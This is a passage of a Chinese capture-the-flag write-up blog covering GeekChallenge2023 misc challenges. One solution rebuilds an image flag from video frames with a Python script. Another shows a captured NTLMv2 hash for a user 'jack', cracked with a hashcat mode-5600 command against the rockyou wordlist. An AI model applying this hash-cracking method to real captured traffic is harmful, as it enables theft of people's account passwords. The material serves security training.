+<p>题目描述:</p>
+<p>“你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:” “[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名…]”。</p>
+<p>附件只有⼀个 kira.mp4</p>
+<p>上脚本</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import os</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cam = cv2.VideoCapture( &quot;kira.mp4&quot;)</span><br><span class="line">try :</span><br><span class="line">    if not os.path.exists( &#x27;data&#x27; ):</span><br><span class="line">         os.makedirs( &#x27;data&#x27; )</span><br><span class="line">except OSError:</span><br><span class="line">     print ( &#x27;Error: Creating directory of data&#x27; )</span><br><span class="line">  </span><br><span class="line">print(&#x27;正在提取图片帧&#x27;)</span><br><span class="line">for currentframe in tqdm(range(0,192)):</span><br><span class="line">#while ( True ):</span><br><span class="line">    ret, frame = cam.read()</span><br><span class="line">    if ret:</span><br><span class="line">         name = &#x27;./data/frame&#x27; + str (currentframe) + &#x27;.jpg&#x27;</span><br><span class="line">         cv2.imwrite(name, frame)</span><br><span class="line">    else :</span><br><span class="line">         break</span><br><span class="line">  </span><br><span class="line">cam.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line">d = set()</span><br><span class="line"></span><br><span class="line">print(&#x27;正在分析各帧白色点坐标:&#x27;)</span><br><span class="line">for tk in tqdm(range(0,192)):</span><br><span class="line">    img = Image.open(f&#x27;./data/frame&#123;tk&#125;.jpg&#x27;)</span><br><span class="line">    pixels = img.load()</span><br><span class="line">    for i in range(5,1920,10):</span><br><span class="line">        for j in range(15,1080,10):</span><br><span class="line">            r, g, b = pixels[i,j]</span><br><span class="line">            if r &gt; 100 and g &gt; 100 and b &gt; 100:</span><br><span class="line">                d.add(f&#x27;&#123;i&#125;|&#123;j&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(133, 133))</span><br><span class="line"></span><br><span class="line">while len(d) != 0:</span><br><span class="line">    a1 = d.pop()</span><br><span class="line">    x1 = a1.split(&#x27;|&#x27;)[0]</span><br><span class="line">    y1 = a1.split(&#x27;|&#x27;)[1]</span><br><span class="line">    pic.putpixel([int(x1)//15,int(y1)//15],(255, 255, 255))</span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>得到图片获得flag</p>
+<img src="/images/jike/image-20240623214551476.png" alt="图片" width="300" height="200">
+
+<p>最后flag为SYC{we1c0m4_T0_De@tH_W0r1d}</p>
+<h3 id="窃听风云-v2"><a href="#窃听风云-v2" class="headerlink" title="窃听风云-v2"></a>窃听风云-v2</h3><p>题目描述:</p>
+<p>这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC{password}</p>
+<p>方法其实和前面那道题一模一样，但是服务器名要变一下，应该是<code>WidgetLLC.Internal</code></p>
+<p>构造NTLMv2爆破文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jack::WidgetLLC.Internal:3E3966C8CACD29F7:DDD46FD8F78C262EAE16918F66185497:010100000000000050FD26D235EDD9011219408CCB8A364800000000020012005700490044004700450054004C004C0043000100100043004C00490045004E00540030003300040024005700690064006700650074004C004C0043002E0049006E007400650072006E0061006C000300360043004C00490045004E005400300033002E005700690064006700650074004C004C0043002E0049006E007400650072006E0061006C00050024005700690064006700650074004C004C0043002E0049006E007400650072006E0061006C000700080050FD26D235EDD90106000400020000000800300030000000000000000000000000300000C78E803920758EC5672C36696EE163F6A4E61C8B5463C247DAEF8571677995A40A001000000000000000000000000000000000000900200053004D00540050002F0075006E007300700065006300690066006900650064000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>使用hashcat和rockyou字典进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 crack2.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到jack100589barney</p>
+<p>最后flag为syc{jack100589barney}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      <a data-url="http://example.com/2024/06/23/jike2023misc/" data-id="clxrmc5k1000050w3a9vbcf0c" data-title="GeekChallenge2023 misc复现" class="article-share-link">分享</a>
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="科来杯第十届山东省大学生网络安全技能大赛复现" class="lazyload">
+        
+      
+      <a href="/2024/06/22/kelai/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          科来杯第十届山东省大学生网络安全技能大赛复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cheekin"><span class="toc-number">1.</span> <span class="toc-text">cheekin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-smilemo"><span class="toc-number">2.</span> <span class="toc-text">ez_smilemo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N0TE"><span class="toc-number">3.</span> <span class="toc-text">DEATH_N0TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E4%B8%80%E7%AB%99%E6%98%AF%E5%93%AA%E5%84%BF%E5%91%A2"><span class="toc-number">4.</span> <span class="toc-text">下一站是哪儿呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Qingwan%E5%BF%83%E9%83%BD%E8%A6%81%E7%A2%8E%E4%BA%86"><span class="toc-number">5.</span> <span class="toc-text">Qingwan心都要碎了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xqr"><span class="toc-number">6.</span> <span class="toc-text">xqr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N1TE"><span class="toc-number">7.</span> <span class="toc-text">DEATH_N1TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%90%AC%E9%A3%8E%E4%BA%91"><span class="toc-number">8.</span> <span class="toc-text">窃听风云</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractMe"><span class="toc-number">9.</span> <span class="toc-text">extractMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E4%BB%A3%E7%9A%84%E7%9C%BC%E6%B3%AA"><span class="toc-number">10.</span> <span class="toc-text">时代的眼泪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%90%AC%E9%A3%8E%E4%BA%91-v2"><span class="toc-number">11.</span> <span class="toc-text">窃听风云-v2</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="yiqing" class="lazyload">
+  <div class="sidebar-author-name">yiqing</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        yiqing
+      </div>
+      
+        <div>
+          基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          24k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          01:47
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cheekin"><span class="toc-number">1.</span> <span class="toc-text">cheekin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-smilemo"><span class="toc-number">2.</span> <span class="toc-text">ez_smilemo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N0TE"><span class="toc-number">3.</span> <span class="toc-text">DEATH_N0TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E4%B8%80%E7%AB%99%E6%98%AF%E5%93%AA%E5%84%BF%E5%91%A2"><span class="toc-number">4.</span> <span class="toc-text">下一站是哪儿呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Qingwan%E5%BF%83%E9%83%BD%E8%A6%81%E7%A2%8E%E4%BA%86"><span class="toc-number">5.</span> <span class="toc-text">Qingwan心都要碎了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xqr"><span class="toc-number">6.</span> <span class="toc-text">xqr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N1TE"><span class="toc-number">7.</span> <span class="toc-text">DEATH_N1TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%90%AC%E9%A3%8E%E4%BA%91"><span class="toc-number">8.</span> <span class="toc-text">窃听风云</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractMe"><span class="toc-number">9.</span> <span class="toc-text">extractMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E4%BB%A3%E7%9A%84%E7%9C%BC%E6%B3%AA"><span class="toc-number">10.</span> <span class="toc-text">时代的眼泪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%90%AC%E9%A3%8E%E4%BA%91-v2"><span class="toc-number">11.</span> <span class="toc-text">窃听风云-v2</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="yiqing" class="lazyload">
+  <div class="sidebar-author-name">yiqing</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.js";
+  
+  const pswp = () => {
+    if (document.querySelectorAll('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    if(document.querySelectorAll('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.2.0-beta.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
